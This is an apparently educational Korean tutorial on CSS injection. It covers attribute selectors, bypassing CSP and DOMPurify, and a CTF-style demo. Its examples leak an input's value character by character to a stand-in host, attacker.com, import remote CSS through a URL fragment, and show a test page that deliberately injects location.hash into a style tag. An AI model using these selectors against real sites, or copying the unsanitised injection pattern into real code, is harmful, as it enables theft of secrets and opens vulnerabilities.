## CSS Injection (CSS-based exfiltration attack)
\*\*CSS Injection(스타일 주입)\*\*은 공격자가 **웹페이지의 CSS 스타일을 조작하거나 새로운 CSS 코드를 삽입하는 공격 기법**입니다.

### 주요 목적:

* 사이트의 외형을 왜곡
* 민감한 정보를 노출 (예: 입력값 훔치기)
* 사용자 인터페이스(UI) 혼란
* 클릭재킹(clickjacking) 등 다른 공격을 위한 기반

---

## ✅ CSS Injection이 발생하는 조건

CSS Injection은 보통 **서버나 클라이언트가 사용자 입력을 필터링하지 않거나 부적절하게 처리**할 때 발생합니다.

예시:

```html
<!-- 사용자 입력값이 직접 style 속성이나 style 태그 내에 삽입되는 경우 -->
<div style="color: {{ user_input }};">Welcome</div>
```

만약 사용자가 다음과 같이 입력했다면:

```
red; background-image: url(javascript:alert(1));
```

결과:

```html
<div style="color: red; background-image: url(javascript:alert(1));">Welcome</div>
```

> 대부분 브라우저는 `url(javascript:...)`을 차단하지만, 일부 구버전에서는 작동하기도 했습니다.

---

## ✅ CSP와 DOMPurify에 대한 우회

보통 보안 위험은 \*\*JavaScript 실행(XSS)\*\*을 생각하지만, 최근 보안 정책(CSP, DOMPurify 등) 때문에 **JavaScript가 막히는 경우**가 많습니다. 이때 **CSS만으로도 의도치 않은 동작**을 유도할 수 있습니다.

### ◾ CSP (Content Security Policy)

* CSP는 페이지 내에서 어떤 리소스(JavaScript, 이미지, 스타일 등)를 불러올 수 있는지를 제한하는 **브라우저 보안 정책**입니다.
* 예: `Content-Security-Policy: script-src 'self'` → 외부 JS 차단
* 예: `default-src 'none'` → 외부 요청 차단
* 예: `style-src 'unsafe-inline'` → <style> 태그 사용 가능
<img width="1182" height="1540" alt="image" src="https://github.com/user-attachments/assets/8f4c2621-d999-4bf7-badf-efbf29e375c4" />


### ◾ DOMPurify

* DOMPurify는 HTML을 \*\*sanitize(정화)\*\*해서 위험한 태그 및 속성 (예: `<script>`, `onerror=...`)을 제거합니다.

### 💡 그러나 DOMPurify는 CSS까지는 완벽히 필터링하지 않음

* 즉, `<style>`이나 `style` 속성 내에 삽입된 **정상적인 CSS 구문**은 살릴 수 있음
* 이 점을 이용해 악의적인 CSS만으로도 공격 가능

---

## 🧠 CSS Injection 구문

| 선택자 구문          | 설명                                                                            |
| --------------- | ----------------------------------------------------------------------------- |
| `[attr]`        | `attr`이라는 이름의 \*\*속성(attribute)\*\*을 가진 모든 요소를 선택                             |
| `[attr=value]`  | `attr`의 값이 **정확히 `value`인 요소**를 선택                                            |
| `[attr~=value]` | `attr`의 값이 공백으로 구분된 여러 값 중에서 **`value`가 포함된 경우** 선택 (ex: class="btn primary") |
| `[attr^=value]` | `attr`의 값이 **`value`로 시작하는(접두사)** 요소를 선택                                      |
| `[attr$=value]` | `attr`의 값이 **`value`로 끝나는(접미사)** 요소를 선택                                       |
| `[attr*=value]` | `attr`의 값에 **`value`라는 문자열이 포함**되어 있으면 선택 (위치 상관 없음)                          |


---

## 😈 CSS를 이용해 정보를 훔친다고?

CSS 자체는 **정보를 읽는 기능은 없지만**, **스타일 조건에 따라 외부 요청을 보낼 수는 있어요.**

예를 들어:

```html
input[name="secret"][value^="a"] {
  background: url("https://attacker.com/leak?q=a");
}
```

위 코드는:

* `name="secret"`인 `<input>` 태그가 있고
* 그 `value` 값이 **'a'로 시작한다면**
* **백그라운드 이미지 요청을 보냄** → `https://attacker.com/leak?q=a`

이렇게 조건이 참일 때만 외부로 요청이 나가기 때문에,
공격자는 해당 요청을 통해 **데이터가 a로 시작하는지 아닌지를 알 수 있는 거죠.**

---

## 🔍 구체적인 예시

웹 페이지에 이런 input이 있다고 가정합시다:

```html
<input name="secret" value="dawn_ctf{secret_flag}">
```

공격자가 삽입한 CSS:

```css
input[name="secret"][value^="d"] {
  background: url("https://attacker.com/leak?q=d");
}
```

서버는 background 이미지를 불러오려고 `https://attacker.com/leak?q=d`에 요청을 보냅니다.

그럼 공격자는 로그를 보고:

> "오, d로 시작하는구나!"

---

## ⏱️ 그런데 이게 비효율적인 이유는?

### 고전 방식: `[value^=문자열]`만 사용

* 예: 첫 번째 문자가 `a`, `b`, `c` ... `z` 중 어떤 건지 확인 → 26번 요청
* 두 번째 문자 확인 → 또 26번 요청
* 길이 20짜리 문자열이면 26 × 20 = **520번 요청**

---

## 🧠 더 똑똑한 방법: 글의 요점 정리

### ✅ 1. 접미사 선택자 (`[attr$=value]`) 도 같이 쓰기

* 예를 들어 문자열이 `"da"`라면:

  * `[value^="d"]` → d로 **시작**
  * `[value$="a"]` → a로 **끝남**
* 두 조건을 모두 만족해야 하므로 **정보 유출이 더 빠르게 가능**

```css
input[name="secret"][value^="d"][value$="a"] {
  background: url("https://attacker.com/leak?q=da");
}
```

### ✅ 2. 병렬 요청

하나의 CSS 파일에 수십 개 선택자를 넣어서 **동시에 여러 조건을 테스트** 가능

```css
<style>
input[name="secret"][value^="da"] { background: url(https://attacker.com/leak?q=da); }
input[name="secret"][value^="db"] { background: url(https://attacker.com/leak?q=db); }
input[name="secret"][value^="dc"] { background: url(https://attacker.com/leak?q=dc); }
/* ... */
</style>
```

* 이렇게 여러 줄 한꺼번에 넣으면
* 사용자가 웹 페이지를 열었을 때, 조건이 일치하는 **딱 한 개의 요청**만 서버로 감
* 공격자는 어떤 요청이 갔는지를 보고 **정확한 값**을 추론

---

## 공격 예제 😎


1️⃣ Fragment(#) 기반 XSS 구조

#### URL 예시

```
https://example.com/page#<style>@import url("https://attacker.com/malicious.css");</style>
```

> ❌ 서버는 `#<script>alert(1)</script>`를 절대 받지 않음
> 서버로 fragment가 직접 가지 않기 때문에, **클라이언트 JS가 fragment를 읽어 DOM에 삽입**해야 XSS 가능:


```javascript
let fragment = window.location.hash; // "#<script>alert(1)</script>"
document.body.innerHTML += fragment;  // DOM에 그대로 삽입 → CSS 성공
```

* 이 구조에서는 fragment 기반 XSS 가능
* 서버가 직접 받지 않아도 공격 성공 가능
* 일반 HTML 렌더링만 하는 서버에서는 **불가능**


 
```
https://example.com/page#<style>@import url("https://attacker.com/malicious.css");</style>
```


[브라우저 URL]                   [서버 요청]             [클라이언트 JS]
https://example.com/page#PAYLOAD  GET /page              window.location.hash -> DOM 삽입
#<style>~      ❌ fragment 없음       document.body.innerHTML += fragment
```

* ❌: 서버에는 fragment 안감
* ✔ : JS가 읽어서 DOM에 넣으면 공격 가능

---

#### fragment 기반 XSS/CSSI 샘플

1️⃣ HTML 샘플 (fragment 기반 CSSI)

```html
<!-- 파일명: fragment-cssi.html -->
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>Fragment CSSI 테스트</title>
</head>
<body>
  <h1>Fragment 기반 CSS Injection 테스트</h1>
  <p>주소창에 # 뒤에 CSS payload를 넣어보세요.</p>

  <script>
    const fragment = window.location.hash;

    if(fragment) {
      // DOM에 style 삽입
      const style = document.createElement('style');
      style.innerHTML = fragment.replace(/^#/, ''); // # 제거 후 적용
      document.head.appendChild(style);
    }
  </script>

  <p>이 글자의 색상이 fragment에 의해 바뀔 수 있습니다.</p>
</body>
</html>
```

### 사용법

* 브라우저 주소창:

```
file:///C:/path/fragment-cssi.html#body{background-color:yellow;color:red;}
```

* 페이지 배경색과 글자색이 변경되는 것을 확인 가능
* 실제로 CSSI가 동작함을 보여주는 안전한 실습용 예제

